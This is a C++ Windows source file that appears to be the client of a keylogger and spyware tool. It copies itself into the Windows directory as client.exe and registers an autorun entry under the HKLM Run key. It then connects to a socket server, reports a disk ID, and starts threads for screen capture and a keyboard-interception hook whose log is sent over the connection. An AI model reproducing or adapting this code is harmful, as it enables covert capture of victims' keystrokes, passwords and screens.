#include <winsock2.h>
#include <ShellAPI.h>
#include <iostream>
#include "Interceptor.h"
#include "screen-id.h"

using namespace std;

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)

constexpr auto FILE_PATH = "log.txt";

BOOL SelfAutorun();
#define STRLEN(x) (sizeof(x)/sizeof(TCHAR) - 1)

SOCKET connection;

DWORD WINAPI hookJob(LPVOID lpParm);

int main(int argc, char* argv[]) {
	SelfAutorun();
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	if (WSAStartup(DLLVersion, &wsaData) != 0) {
		cout << "Error load lib" << endl;
		exit(1);
	}

	string command;

	ShellExecuteA(NULL, "open", "server", NULL, NULL, SW_RESTORE);

	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(1111);
	addr.sin_family = AF_INET;

	connection = socket(AF_INET, SOCK_STREAM, NULL);
	if (connect(connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
		cout << "Error: failed connect to server." << endl;
		return 0;
	}
	cout << "Connected to server!" << endl;
	cout << "ID PC - " << GetHDD() << endl;

	HANDLE hThreadS = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)do_screen, NULL, NULL, NULL);
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)hookJob, NULL, NULL, NULL);

	if (hThread && hThreadS)
		while (true)
		{
			cin >> command;
			if (command == "stop") {
				system("pause");
				return 0;
			} else if (command == "show")
				ShellExecuteA(NULL, "open", "result.txt", NULL, NULL, SW_RESTORE);
							
		}
	else
		exit(EXIT_FAILURE);

	system("pause");
	return 0;
}

BOOL SelfAutorun() {
	HKEY hKey = NULL;
	LONG lResult = 0;
	TCHAR szExeName[MAX_PATH + 1];
	TCHAR szWinPath[MAX_PATH + 1];
	GetModuleFileName(NULL, szExeName, STRLEN(szExeName));
	GetWindowsDirectory(szWinPath, STRLEN(szWinPath));
	lstrcat(szWinPath, L"\\client.exe");
	if (0 == CopyFile(szExeName, szWinPath, FALSE)) {
		return FALSE;
	}
	lResult = RegOpenKey(
		HKEY_LOCAL_MACHINE,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		&hKey);
	if (ERROR_SUCCESS != lResult) {
		return FALSE;
	}
	RegSetValueEx(hKey, L"Autorun", 0, REG_SZ, (PBYTE)szWinPath,
		lstrlen(szWinPath) * sizeof(TCHAR) + 1);
	RegCloseKey(hKey);
	return TRUE;
}

DWORD WINAPI hookJob(LPVOID lpParm)
{

	Interceptor* interceptor = Interceptor::getInstance();
	if (interceptor == NULL)
		exit(EXIT_FAILURE);

	if (interceptor->init(FILE_PATH, connection) == -1)
		exit(EXIT_FAILURE);

	MSG message;
	while (GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	return 0;
}
